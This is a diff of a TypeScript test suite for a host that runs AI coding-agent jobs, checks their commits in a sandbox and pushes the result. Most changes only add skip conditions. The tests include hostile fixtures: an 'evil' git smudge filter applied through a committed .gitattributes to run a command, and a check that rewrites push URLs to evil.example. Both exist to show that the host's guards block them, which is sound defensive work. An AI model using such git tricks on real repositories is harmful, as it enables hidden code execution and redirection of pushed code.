@@ -44,7 +44,15 @@ import {
 import { checkLoop, duBytes, type Exec, GuardTripped, runChecks } from "../src/checks.ts";
 import { paths } from "../src/config.ts";
 import { runJob } from "../src/job.ts";
-import { controlPlane, fakeAdapter, fakeCloud, git, job, scratchRepo } from "./helpers.ts";
+import {
+  controlPlane,
+  fakeAdapter,
+  fakeCloud,
+  git,
+  job,
+  NO_GIT_ATTR_SOURCE,
+  scratchRepo,
+} from "./helpers.ts";
 
 const cleanups: (() => Promise<void>)[] = [];
 afterEach(async () => {
@@ -1287,26 +1295,29 @@ describe("the host's checks (ADR 0501)", () => {
 });
 
 describe("the clean tree export (ADR 0501)", () => {
-  it("runs no filter: an owner's smudge filter and an in-tree .gitattributes do nothing on the host", async () => {
-    const repo = await scratchRepo();
-    cleanups.push(repo.cleanup);
-    const wt = join(repo.root, "seed");
-    const pwned = join(repo.root, "PWNED");
-    // The owner's own config has a filter; the agent commits a .gitattributes that applies it.
-    git(wt, "config", "filter.evil.smudge", `touch ${pwned}; cat`);
-    git(wt, "config", "filter.evil.clean", "cat");
-    await writeFile(join(wt, ".gitattributes"), "* filter=evil\n");
-    await writeFile(join(wt, "a.txt"), "as committed\n");
-    git(wt, "add", ".");
-    git(wt, "-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "-qm", "attrs");
-    await rm(pwned, { force: true });
-    const sha = git(wt, "rev-parse", "HEAD");
-    const dest = join(repo.root, "tree");
-    await mkdir(dest);
-    await repo.host.exportTree(wt, sha, dest, join(repo.root, "index"));
-    expect(await readFile(join(dest, "a.txt"), "utf8")).toBe("as committed\n");
-    await expect(readFile(pwned, "utf8")).rejects.toThrow();
-  });
+  it.skipIf(NO_GIT_ATTR_SOURCE)(
+    "runs no filter: an owner's smudge filter and an in-tree .gitattributes do nothing on the host",
+    async () => {
+      const repo = await scratchRepo();
+      cleanups.push(repo.cleanup);
+      const wt = join(repo.root, "seed");
+      const pwned = join(repo.root, "PWNED");
+      // The owner's own config has a filter; the agent commits a .gitattributes that applies it.
+      git(wt, "config", "filter.evil.smudge", `touch ${pwned}; cat`);
+      git(wt, "config", "filter.evil.clean", "cat");
+      await writeFile(join(wt, ".gitattributes"), "* filter=evil\n");
+      await writeFile(join(wt, "a.txt"), "as committed\n");
+      git(wt, "add", ".");
+      git(wt, "-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "-qm", "attrs");
+      await rm(pwned, { force: true });
+      const sha = git(wt, "rev-parse", "HEAD");
+      const dest = join(repo.root, "tree");
+      await mkdir(dest);
+      await repo.host.exportTree(wt, sha, dest, join(repo.root, "index"));
+      expect(await readFile(join(dest, "a.txt"), "utf8")).toBe("as committed\n");
+      await expect(readFile(pwned, "utf8")).rejects.toThrow();
+    },
+  );
 });
 
 describe("runJob with checks (ADR 0501)", () => {
@@ -1340,73 +1351,79 @@ describe("runJob with checks (ADR 0501)", () => {
       summary?: string;
     };
 
-  it("runs the checks on a clean tree of the build's commit, types a failure into the same session, and pushes the checked head", async () => {
-    const j = job({
-      checks: {
-        commands: [
-          { name: "fixed", run: "test -f fixed.txt", timeoutMs: 5_000 },
-          // What the session left that git ignores never reaches the check.
-          { name: "clean", run: "test ! -e node_modules && test ! -e .git", timeoutMs: 5_000 },
-        ],
-        fixRounds: 2,
-      },
-    });
-    let turn = 0;
-    const { repo, cloud, adapter, run } = await setup(j, async (wt) => {
-      turn++;
-      if (turn === 1) {
-        await writeFile(join(wt, ".gitignore"), "node_modules/\n");
-        await mkdir(join(wt, "node_modules", "vitest"), { recursive: true });
-        await writeFile(join(wt, "node_modules", "vitest", "index.js"), "patched");
-        await writeFile(join(wt, "README.md"), "# scratch\nfirst\n");
-        await writeFile(join(wt, RESULT_FILE), JSON.stringify({ notes: "first" }));
-      } else {
-        await writeFile(join(wt, "fixed.txt"), "fixed\n"); // left uncommitted: the host commits it
-      }
-      return [{ type: "session.ended" as const, outcome: "completed" as const }];
-    });
-    const report = await run();
-    expect(report.outcome, `${report.error} ${report.summary}`).toBe("completed");
-    expect(adapter.steered).toHaveLength(1);
-    expect(adapter.steered[0]).toMatch(/`test -f fixed.txt` exited with 1/);
-    const handback = handbackOf(cloud, j);
-    expect(handback.checks?.map((c) => [c.name, c.round, c.exitCode])).toEqual([
-      ["fixed", 0, 1],
-      ["clean", 0, 0],
-      ["fixed", 1, 0],
-      ["clean", 1, 0],
-    ]);
-    expect(handback.checks?.[3]?.headSha).toBe(handback.headSha);
-    expect(git(repo.bare, "rev-parse", j.branch)).toBe(handback.headSha);
-    expect(git(repo.bare, "ls-tree", "-r", "--name-only", j.branch)).toContain("fixed.txt");
-  });
+  it.skipIf(NO_GIT_ATTR_SOURCE)(
+    "runs the checks on a clean tree of the build's commit, types a failure into the same session, and pushes the checked head",
+    async () => {
+      const j = job({
+        checks: {
+          commands: [
+            { name: "fixed", run: "test -f fixed.txt", timeoutMs: 5_000 },
+            // What the session left that git ignores never reaches the check.
+            { name: "clean", run: "test ! -e node_modules && test ! -e .git", timeoutMs: 5_000 },
+          ],
+          fixRounds: 2,
+        },
+      });
+      let turn = 0;
+      const { repo, cloud, adapter, run } = await setup(j, async (wt) => {
+        turn++;
+        if (turn === 1) {
+          await writeFile(join(wt, ".gitignore"), "node_modules/\n");
+          await mkdir(join(wt, "node_modules", "vitest"), { recursive: true });
+          await writeFile(join(wt, "node_modules", "vitest", "index.js"), "patched");
+          await writeFile(join(wt, "README.md"), "# scratch\nfirst\n");
+          await writeFile(join(wt, RESULT_FILE), JSON.stringify({ notes: "first" }));
+        } else {
+          await writeFile(join(wt, "fixed.txt"), "fixed\n"); // left uncommitted: the host commits it
+        }
+        return [{ type: "session.ended" as const, outcome: "completed" as const }];
+      });
+      const report = await run();
+      expect(report.outcome, `${report.error} ${report.summary}`).toBe("completed");
+      expect(adapter.steered).toHaveLength(1);
+      expect(adapter.steered[0]).toMatch(/`test -f fixed.txt` exited with 1/);
+      const handback = handbackOf(cloud, j);
+      expect(handback.checks?.map((c) => [c.name, c.round, c.exitCode])).toEqual([
+        ["fixed", 0, 1],
+        ["clean", 0, 0],
+        ["fixed", 1, 0],
+        ["clean", 1, 0],
+      ]);
+      expect(handback.checks?.[3]?.headSha).toBe(handback.headSha);
+      expect(git(repo.bare, "rev-parse", j.branch)).toBe(handback.headSha);
+      expect(git(repo.bare, "ls-tree", "-r", "--name-only", j.branch)).toContain("fixed.txt");
+    },
+  );
 
-  it("sends a failing check on a stream-json session to a person, never into a fix round it can't take", async () => {
-    const j = job({
-      checks: { commands: [{ name: "tests", run: "false", timeoutMs: 5_000 }], fixRounds: 2 },
-    });
-    const { cloud, adapter, run } = await setup(j, async (wt) => {
-      await writeFile(join(wt, "README.md"), "# scratch\nchanged\n");
-      return [{ type: "session.ended" as const, outcome: "completed" as const }];
-    });
-    const start = adapter.startSession.bind(adapter);
-    adapter.startSession = async (...args) => ({ ...(await start(...args)), mode: "stream" });
-    let continued = 0;
-    const cont = adapter.continueSession?.bind(adapter);
-    adapter.continueSession = (...args) => {
-      continued++;
-      if (!cont) throw new Error("no continueSession");
-      return cont(...args);
-    };
-    const report = await run();
-    expect(continued).toBe(0);
-    expect(adapter.steered).toHaveLength(0);
-    // The build hands back with the failure for a person: no attempt burned on a throw.
-    expect(report.outcome, `${report.error}`).toBe("completed");
-    const handback = handbackOf(cloud, j);
-    expect(handback.checks).toMatchObject([{ name: "tests", exitCode: 1, round: 0 }]);
-    expect(handback.summary).toMatch(/can't be continued on this runner/);
-  });
+  it.skipIf(NO_GIT_ATTR_SOURCE)(
+    "sends a failing check on a stream-json session to a person, never into a fix round it can't take",
+    async () => {
+      const j = job({
+        checks: { commands: [{ name: "tests", run: "false", timeoutMs: 5_000 }], fixRounds: 2 },
+      });
+      const { cloud, adapter, run } = await setup(j, async (wt) => {
+        await writeFile(join(wt, "README.md"), "# scratch\nchanged\n");
+        return [{ type: "session.ended" as const, outcome: "completed" as const }];
+      });
+      const start = adapter.startSession.bind(adapter);
+      adapter.startSession = async (...args) => ({ ...(await start(...args)), mode: "stream" });
+      let continued = 0;
+      const cont = adapter.continueSession?.bind(adapter);
+      adapter.continueSession = (...args) => {
+        continued++;
+        if (!cont) throw new Error("no continueSession");
+        return cont(...args);
+      };
+      const report = await run();
+      expect(continued).toBe(0);
+      expect(adapter.steered).toHaveLength(0);
+      // The build hands back with the failure for a person: no attempt burned on a throw.
+      expect(report.outcome, `${report.error}`).toBe("completed");
+      const handback = handbackOf(cloud, j);
+      expect(handback.checks).toMatchObject([{ name: "tests", exitCode: 1, round: 0 }]);
+      expect(handback.summary).toMatch(/can't be continued on this runner/);
+    },
+  );
 
   it("fails closed without an isolated exec: reported not run, no fix round, the build still hands back", async () => {
     const j = job({
@@ -1454,88 +1471,97 @@ describe("runJob with checks (ADR 0501)", () => {
     }
   });
 
-  it("re-runs the git guards after the checks: a check that rewires git fails the job and nothing is pushed", async () => {
-    const repoBox: { wt?: string } = {};
-    const j = job({
-      checks: {
-        commands: [
-          // A test stand-in for code under check that escapes to the worktree (the real sandbox
-          // and the check container can't reach it): it adds a URL rewrite for the push.
-          {
-            name: "evil",
-            run: 'git -C "$WT" config url.https://evil.example/.insteadOf https://github.com/',
-            timeoutMs: 5_000,
-          },
-        ],
-        fixRounds: 0,
-      },
-    });
-    const { repo, cloud, run } = await setup(j, async (wt) => {
-      repoBox.wt = wt;
-      await writeFile(join(wt, "README.md"), "# scratch\nchanged\n");
-      return [{ type: "session.ended" as const, outcome: "completed" as const }];
-    });
-    const report = await run({
-      checkSandbox: (_job, dirs) => (command, signal) =>
-        spawnCheck(
-          ["/bin/sh", "-c", command.run],
-          {
-            cwd: dirs.dir,
-            env: { PATH: process.env.PATH ?? "", WT: repoBox.wt ?? "" },
-            timeoutMs: command.timeoutMs,
-          },
-          signal,
-        ),
-    });
-    expect(report.outcome).toBe("failed");
-    expect(report.error).toMatch(/git config changed after the checks of round 0/);
-    expect(handbackOf(cloud, j).headSha).toBeUndefined();
-    expect(() => git(repo.bare, "rev-parse", "--verify", j.branch)).toThrow();
-  });
+  it.skipIf(NO_GIT_ATTR_SOURCE)(
+    "re-runs the git guards after the checks: a check that rewires git fails the job and nothing is pushed",
+    async () => {
+      const repoBox: { wt?: string } = {};
+      const j = job({
+        checks: {
+          commands: [
+            // A test stand-in for code under check that escapes to the worktree (the real sandbox
+            // and the check container can't reach it): it adds a URL rewrite for the push.
+            {
+              name: "evil",
+              run: 'git -C "$WT" config url.https://evil.example/.insteadOf https://github.com/',
+              timeoutMs: 5_000,
+            },
+          ],
+          fixRounds: 0,
+        },
+      });
+      const { repo, cloud, run } = await setup(j, async (wt) => {
+        repoBox.wt = wt;
+        await writeFile(join(wt, "README.md"), "# scratch\nchanged\n");
+        return [{ type: "session.ended" as const, outcome: "completed" as const }];
+      });
+      const report = await run({
+        checkSandbox: (_job, dirs) => (command, signal) =>
+          spawnCheck(
+            ["/bin/sh", "-c", command.run],
+            {
+              cwd: dirs.dir,
+              env: { PATH: process.env.PATH ?? "", WT: repoBox.wt ?? "" },
+              timeoutMs: command.timeoutMs,
+            },
+            signal,
+          ),
+      });
+      expect(report.outcome).toBe("failed");
+      expect(report.error).toMatch(/git config changed after the checks of round 0/);
+      expect(handbackOf(cloud, j).headSha).toBeUndefined();
+      expect(() => git(repo.bare, "rev-parse", "--verify", j.branch)).toThrow();
+    },
+  );
 
-  it("re-runs the adapter's own git dir check after the checks (a container's job repo)", async () => {
-    const j = job({
-      checks: { commands: [{ name: "tests", run: "true", timeoutMs: 5_000 }], fixRounds: 0 },
-    });
-    let calls = 0;
-    const { cloud, adapter, run } = await setup(j, async (wt) => {
-      await writeFile(join(wt, "README.md"), "# scratch\nchanged\n");
-      return [{ type: "session.ended" as const, outcome: "completed" as const }];
-    });
-    adapter.checkWorkspace = async () =>
-      ++calls >= 2 ? ["the session created commondir in its git dir"] : [];
-    const report = await run();
-    expect(report.outcome).toBe("failed");
-    expect(report.error).toMatch(/commondir/);
-    expect(handbackOf(cloud, j).headSha).toBeUndefined();
-  });
+  it.skipIf(NO_GIT_ATTR_SOURCE)(
+    "re-runs the adapter's own git dir check after the checks (a container's job repo)",
+    async () => {
+      const j = job({
+        checks: { commands: [{ name: "tests", run: "true", timeoutMs: 5_000 }], fixRounds: 0 },
+      });
+      let calls = 0;
+      const { cloud, adapter, run } = await setup(j, async (wt) => {
+        await writeFile(join(wt, "README.md"), "# scratch\nchanged\n");
+        return [{ type: "session.ended" as const, outcome: "completed" as const }];
+      });
+      adapter.checkWorkspace = async () =>
+        ++calls >= 2 ? ["the session created commondir in its git dir"] : [];
+      const report = await run();
+      expect(report.outcome).toBe("failed");
+      expect(report.error).toMatch(/commondir/);
+      expect(handbackOf(cloud, j).headSha).toBeUndefined();
+    },
+  );
 
-  it("runs an attached PR's checks on its head before the reviewer session, once", async () => {
-    const order: string[] = [];
-    const j = job({
-      stage: "verify",
-      checks: { commands: [{ name: "tests", run: "true", timeoutMs: 5_000 }], fixRounds: 2 },
-    });
-    const { repo, cloud, run } = await setup(j, async (wt) => {
-      order.push("session");
-      // The reviewer leaves a change behind: it must not be what the checks saw.
-      await writeFile(join(wt, "left-by-reviewer.txt"), "x");
-      await writeFile(join(wt, RESULT_FILE), JSON.stringify({ verdict: "pass" }));
-      return [{ type: "session.ended" as const, outcome: "completed" as const }];
-    });
-    const report = await run({
-      checkSandbox: (jj, dirs) => {
-        const inner = shellSandbox(jj, dirs);
-        return async (command, signal) => {
-          order.push("check");
-          return inner(command, signal);
-        };
-      },
-    });
-    expect(report.outcome, `${report.error}`).toBe("completed");
-    expect(order).toEqual(["check", "session"]);
-    const checks = handbackOf(cloud, j).checks ?? [];
-    expect(checks).toMatchObject([{ name: "tests", exitCode: 0, round: 0 }]);
-    expect(checks[0]?.headSha).toBe(git(repo.bare, "rev-parse", j.repo.baseRef));
-  });
+  it.skipIf(NO_GIT_ATTR_SOURCE)(
+    "runs an attached PR's checks on its head before the reviewer session, once",
+    async () => {
+      const order: string[] = [];
+      const j = job({
+        stage: "verify",
+        checks: { commands: [{ name: "tests", run: "true", timeoutMs: 5_000 }], fixRounds: 2 },
+      });
+      const { repo, cloud, run } = await setup(j, async (wt) => {
+        order.push("session");
+        // The reviewer leaves a change behind: it must not be what the checks saw.
+        await writeFile(join(wt, "left-by-reviewer.txt"), "x");
+        await writeFile(join(wt, RESULT_FILE), JSON.stringify({ verdict: "pass" }));
+        return [{ type: "session.ended" as const, outcome: "completed" as const }];
+      });
+      const report = await run({
+        checkSandbox: (jj, dirs) => {
+          const inner = shellSandbox(jj, dirs);
+          return async (command, signal) => {
+            order.push("check");
+            return inner(command, signal);
+          };
+        },
+      });
+      expect(report.outcome, `${report.error}`).toBe("completed");
+      expect(order).toEqual(["check", "session"]);
+      const checks = handbackOf(cloud, j).checks ?? [];
+      expect(checks).toMatchObject([{ name: "tests", exitCode: 0, round: 0 }]);
+      expect(checks[0]?.headSha).toBe(git(repo.bare, "rev-parse", j.repo.baseRef));
+    },
+  );
 });
